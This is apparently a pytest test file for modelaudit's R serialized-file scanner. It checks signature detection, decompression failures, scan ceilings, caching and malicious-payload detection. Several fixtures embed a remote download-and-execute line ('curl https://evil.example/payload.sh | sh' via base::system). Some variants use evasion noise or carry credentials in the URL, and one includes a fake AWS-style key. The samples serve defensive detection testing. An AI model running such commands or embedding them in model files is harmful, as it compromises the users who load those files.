from __future__ import annotations

import gzip
import lzma
from pathlib import Path
from unittest.mock import patch

from modelaudit import core
from modelaudit.cache import get_cache_manager, reset_cache_manager
from modelaudit.scanners import get_scanner_for_file
from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, Check, CheckStatus, IssueSeverity, ScanResult
from modelaudit.scanners.r_serialized_scanner import RSerializedScanner
from modelaudit.utils.file.detection import detect_file_format, detect_format_from_extension


def _write_raw_r_serialized(path: Path, body: str, *, workspace_header: bool = False) -> None:
    prefix = "RDX2\nX\n" if workspace_header else "X\n"
    path.write_bytes((prefix + body).encode("utf-8"))


def _write_gzip_r_serialized(path: Path, body: str, *, workspace_header: bool = True) -> None:
    payload_prefix = "RDX2\nX\n" if workspace_header else "X\n"
    with gzip.open(path, "wb") as stream:
        stream.write((payload_prefix + body).encode("utf-8"))


def _write_xz_r_serialized(path: Path, body: str, *, dict_size: int) -> None:
    payload = ("X\n" + body).encode("utf-8")
    compressed = lzma.compress(
        payload,
        format=lzma.FORMAT_XZ,
        filters=[{"id": lzma.FILTER_LZMA2, "dict_size": dict_size}],
    )
    path.write_bytes(compressed)


def _write_concatenated_xz_r_serialized(path: Path, bodies: list[str], *, dict_size: int) -> None:
    compressed_parts = [
        lzma.compress(
            ("X\n" + body).encode("utf-8"),
            format=lzma.FORMAT_XZ,
            filters=[{"id": lzma.FILTER_LZMA2, "dict_size": dict_size}],
        )
        for body in bodies
    ]
    path.write_bytes(b"".join(compressed_parts))


def _check_by_name(result: ScanResult, name: str) -> list[Check]:
    return [check for check in result.checks if check.name == name]


def test_can_handle_raw_rds_signature(tmp_path: Path) -> None:
    path = tmp_path / "safe.rds"
    _write_raw_r_serialized(path, "model\nlm\ncoefficients")

    assert RSerializedScanner.can_handle(str(path))


def test_can_handle_compressed_rdata_signature(tmp_path: Path) -> None:
    path = tmp_path / "workspace.rdata"
    _write_gzip_r_serialized(path, "workspace\nmodel_a\nmodel_b")

    assert RSerializedScanner.can_handle(str(path))


def test_wrong_extension_with_no_signature_is_not_handled(tmp_path: Path) -> None:
    path = tmp_path / "payload.bin"
    path.write_bytes(b"not-an-r-serialized-object")

    assert not RSerializedScanner.can_handle(str(path))


def test_scan_benign_rds_model_does_not_raise_critical(tmp_path: Path) -> None:
    path = tmp_path / "benign.rds"
    _write_raw_r_serialized(
        path,
        "\n".join(
            [
                "model",
                "glm",
                "feature_systematic_score",
                "evaluation_metric",
                "parse_date_feature",
            ]
        ),
    )

    result = RSerializedScanner().scan(str(path))

    assert result.success is True
    assert all(check.severity != IssueSeverity.CRITICAL for check in result.checks)

    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
    assert len(symbol_checks) == 1
    assert symbol_checks[0].status == CheckStatus.PASSED


def test_scan_bounded_r_serialized_payload_is_inconclusive(tmp_path: Path) -> None:
    path = tmp_path / "bounded.rds"
    _write_raw_r_serialized(path, "safe\n" * 64)

    result = RSerializedScanner(config={"r_max_scan_bytes": 32}).scan(str(path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "r_serialized_byte_ceiling_incomplete" in result.metadata["scan_outcome_reasons"]


def test_scan_decode_failure_is_explicitly_inconclusive(tmp_path: Path) -> None:
    path = tmp_path / "read-failure.rds"
    _write_raw_r_serialized(path, "safe\nmodel\nweights")

    with patch.object(
        RSerializedScanner,
        "_read_payload_for_analysis",
        side_effect=OSError("simulated R payload read failure"),
    ):
        direct = RSerializedScanner().scan(str(path))
        aggregate = core.scan_model_directory_or_file(str(path), cache_scan_results=False)

    assert direct.success is False
    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert direct.metadata["scan_outcome_reasons"] == ["r_serialized_decode_incomplete"]
    assert all(check.severity not in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for check in direct.checks)
    decompression_check = _check_by_name(direct, "R Serialized Decompression")[0]
    assert decompression_check.details["analysis_incomplete"] is True
    assert decompression_check.details["scan_outcome_reason"] == "r_serialized_decode_incomplete"

    metadata = next(iter(aggregate.file_metadata.values()))
    assert metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert metadata["scan_outcome_reasons"] == ["r_serialized_decode_incomplete"]
    assert core.determine_exit_code(aggregate) == 2


def test_scan_string_extraction_ceiling_reports_incomplete_late_payload_analysis(tmp_path: Path) -> None:
    path = tmp_path / "late-payload.rds"
    _write_raw_r_serialized(
        path,
        "\n".join(
            [
                "feature_000",
                "feature_001",
                "feature_002",
                "expression",
                "language",
                "base::system('curl https://evil.example/payload.sh | sh')",
            ]
        ),
    )

    full_result = RSerializedScanner(config={"r_max_extracted_strings": 100}).scan(str(path))
    limited_result = RSerializedScanner(config={"r_max_extracted_strings": 2}).scan(str(path))

    assert any(check.severity == IssueSeverity.CRITICAL for check in full_result.checks)
    assert limited_result.success is False
    assert limited_result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "r_serialized_string_extraction_incomplete" in limited_result.metadata["scan_outcome_reasons"]
    assert not any(check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for check in limited_result.checks)
    ceiling_checks = _check_by_name(limited_result, "String Extraction Ceiling")
    assert len(ceiling_checks) == 1
    assert ceiling_checks[0].severity == IssueSeverity.INFO
    assert "configured extracted-string ceiling" in ceiling_checks[0].message
    assert ceiling_checks[0].details["analysis_incomplete"] is True
    assert ceiling_checks[0].details["scan_outcome_reason"] == "r_serialized_string_extraction_incomplete"


def test_scan_string_extraction_ceiling_is_exit2_and_not_cached(tmp_path: Path) -> None:
    path = tmp_path / "limited.rds"
    _write_raw_r_serialized(path, "feature_000\nfeature_001\nfeature_002\nfeature_003")
    cache_dir = tmp_path / "cache"

    reset_cache_manager()
    try:
        first = core.scan_model_directory_or_file(
            str(path),
            r_max_extracted_strings=2,
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        second = core.scan_model_directory_or_file(
            str(path),
            r_max_extracted_strings=2,
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        for aggregate in (first, second):
            metadata = aggregate.file_metadata[str(path)]
            assert aggregate.success is False
            assert metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
            assert "r_serialized_string_extraction_incomplete" in metadata["scan_outcome_reasons"]
            assert core.determine_exit_code(aggregate) == 2
            assert not any(
                issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in aggregate.issues
            )
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_dense_text_payload_still_reports_stuffing_warning(tmp_path: Path) -> None:
    path = tmp_path / "dense.rds"
    _write_raw_r_serialized(path, "A" * 1_000_100)

    result = RSerializedScanner().scan(str(path))

    stuffing_checks = _check_by_name(result, "Serialized Payload Stuffing Detection")
    assert len(stuffing_checks) == 1
    assert stuffing_checks[0].severity == IssueSeverity.WARNING
    assert "scan_outcome" not in result.metadata


def test_scan_benign_rdata_workspace_passes_signature_and_context_checks(tmp_path: Path) -> None:
    path = tmp_path / "workspace.rda"
    _write_raw_r_serialized(path, "workspace\nmodel_one\nmodel_two", workspace_header=True)

    result = RSerializedScanner().scan(str(path))

    signature_checks = _check_by_name(result, "R Serialization Signature")
    assert len(signature_checks) == 1
    assert signature_checks[0].status == CheckStatus.PASSED

    payload_checks = _check_by_name(result, "Serialized Expression Payload Detection")
    assert len(payload_checks) == 1
    assert payload_checks[0].status == CheckStatus.PASSED


def test_scan_detects_malicious_expression_and_bypass_noise(tmp_path: Path) -> None:
    path = tmp_path / "malicious.rdata"
    _write_raw_r_serialized(
        path,
        "\n".join(
            [
                "expression",
                "language",
                "base::system('curl https://evil.example/payload.sh # harmless comment | sh')",
                "AKIAABCDEFGHIJKLMNOP",
            ]
        ),
        workspace_header=True,
    )

    result = RSerializedScanner().scan(str(path))

    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
    assert len(symbol_checks) == 1
    assert symbol_checks[0].status == CheckStatus.FAILED
    assert symbol_checks[0].severity == IssueSeverity.CRITICAL

    payload_checks = _check_by_name(result, "Serialized Expression Payload Detection")
    assert len(payload_checks) == 1
    assert payload_checks[0].status == CheckStatus.FAILED
    assert payload_checks[0].severity == IssueSeverity.CRITICAL

    network_checks = _check_by_name(result, "Embedded Network Indicator Detection")
    assert len(network_checks) == 1
    assert network_checks[0].status == CheckStatus.FAILED

    credential_checks = _check_by_name(result, "Credential-like String Detection")
    assert len(credential_checks) == 1
    assert credential_checks[0].status == CheckStatus.FAILED


def test_scan_redacts_embedded_network_indicator_urls(tmp_path: Path) -> None:
    path = tmp_path / "malicious.rds"
    _write_raw_r_serialized(
        path,
        "\n".join(
            [
                "expression",
                (
                    "base::system('curl "
                    "https://user:pass@evil.example/payload.sh?token=SECRET_TOKEN#SECRET_FRAGMENT | sh')"
                ),
            ]
        ),
    )

    result = RSerializedScanner().scan(str(path))

    network_checks = _check_by_name(result, "Embedded Network Indicator Detection")
    assert len(network_checks) == 1
    details = network_checks[0].details
    assert details["urls"] == ["https://evil.example/payload.sh"]
    assert "user" not in str(details)
    assert "pass" not in str(details)
    assert "SECRET_TOKEN" not in str(details)
    assert "SECRET_FRAGMENT" not in str(details)


def test_scan_doc_heavy_content_with_risky_words_is_not_critical(tmp_path: Path) -> None:
    path = tmp_path / "docs_only.rds"
    _write_raw_r_serialized(
        path,
        "\n".join(
            [
                "# documentation: this model report mentions system and eval terms",
                "# description: parse values for evaluation tables only",
                "# comment: no function invocation should run",
            ]
        ),
    )

    result = RSerializedScanner().scan(str(path))

    critical_checks = [check for check in result.checks if check.severity == IssueSeverity.CRITICAL]
    assert critical_checks == []

    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
    assert len(symbol_checks) == 1
    assert symbol_checks[0].status == CheckStatus.PASSED


def test_scan_corrupt_gzip_stream_is_handled_fail_closed(tmp_path: Path) -> None:
    path = tmp_path / "corrupt.rds"
    path.write_bytes(b"\x1f\x8b\x08\x00\x00\x00")

    assert RSerializedScanner.can_handle(str(path))
    result = RSerializedScanner().scan(str(path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "r_serialized_decode_incomplete" in result.metadata["scan_outcome_reasons"]
    decompression_checks = _check_by_name(result, "R Serialized Decompression")
    assert len(decompression_checks) == 1
    assert decompression_checks[0].status == CheckStatus.FAILED


def test_scan_xz_memory_limited_stream_is_handled_fail_closed(tmp_path: Path) -> None:
    path = tmp_path / "memlimit.rds"
    _write_xz_r_serialized(path, "safe", dict_size=1 << 24)

    assert RSerializedScanner.can_handle(str(path))
    scanner = RSerializedScanner(config={"r_max_decompressed_bytes": 1024})
    result = scanner.scan(str(path))

    assert result.success is False
    decompression_checks = _check_by_name(result, "R Serialized Decompression")
    assert len(decompression_checks) == 1
    assert decompression_checks[0].status == CheckStatus.FAILED


def test_scan_benign_xz_stream_passes_decompression_checks(tmp_path: Path) -> None:
    path = tmp_path / "safe-xz.rds"
    _write_xz_r_serialized(path, "safe\nmodel\nweights", dict_size=1 << 24)

    assert RSerializedScanner.can_handle(str(path))
    result = RSerializedScanner().scan(str(path))

    assert result.success is True
    decompression_checks = _check_by_name(result, "R Serialized Decompression")
    assert len(decompression_checks) == 1
    assert decompression_checks[0].status == CheckStatus.PASSED


def test_scan_truncated_xz_stream_is_handled_fail_closed(tmp_path: Path) -> None:
    path = tmp_path / "truncated-xz.rds"
    _write_xz_r_serialized(path, "safe\nmodel\nweights", dict_size=1 << 20)
    path.write_bytes(path.read_bytes()[:-16])

    assert RSerializedScanner.can_handle(str(path))
    result = RSerializedScanner().scan(str(path))

    assert result.success is False
    decompression_checks = _check_by_name(result, "R Serialized Decompression")
    assert len(decompression_checks) == 1
    assert decompression_checks[0].status == CheckStatus.FAILED


def test_scan_concatenated_xz_streams_preserve_later_malicious_payloads(tmp_path: Path) -> None:
    path = tmp_path / "concatenated-xz.rds"
    _write_concatenated_xz_r_serialized(
        path,
        [
            "safe\nmodel\nweights",
            "expression\nbase::system('curl https://evil.example/payload.sh | sh')",
        ],
        dict_size=1 << 20,
    )

    assert RSerializedScanner.can_handle(str(path))
    result = RSerializedScanner().scan(str(path))

    assert result.success is False

    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
    assert len(symbol_checks) == 1
    assert symbol_checks[0].status == CheckStatus.FAILED
    assert symbol_checks[0].severity == IssueSeverity.CRITICAL

    payload_checks = _check_by_name(result, "Serialized Expression Payload Detection")
    assert len(payload_checks) == 1
    assert payload_checks[0].status == CheckStatus.FAILED
    assert payload_checks[0].severity == IssueSeverity.CRITICAL


def test_large_non_r_xz_payload_is_not_claimed_by_r_scanner(tmp_path: Path) -> None:
    path = tmp_path / "not-r-bomb.rds"
    payload = b"NOT_R_FORMAT\n" + (b"A" * 250_000)
    path.write_bytes(
        lzma.compress(
            payload,
            format=lzma.FORMAT_XZ,
            filters=[{"id": lzma.FILTER_LZMA2, "dict_size": 1 << 20}],
        )
    )

    assert not RSerializedScanner.can_handle(str(path))
    assert get_scanner_for_file(str(path)) is None

    result = core.scan_file(str(path))
    assert result.scanner_name == "unknown"
    assert _check_by_name(result, "R Serialized Decompression") == []


def test_r_serialized_routes_through_detection_and_registry(tmp_path: Path) -> None:
    path = tmp_path / "model.rdata"
    _write_raw_r_serialized(path, "workspace\nmodel", workspace_header=True)

    assert detect_file_format(str(path)) == "r_serialized"
    assert detect_format_from_extension(str(path)) == "r_serialized"

    scanner = get_scanner_for_file(str(path))
    assert scanner is not None
    assert scanner.name == "r_serialized"
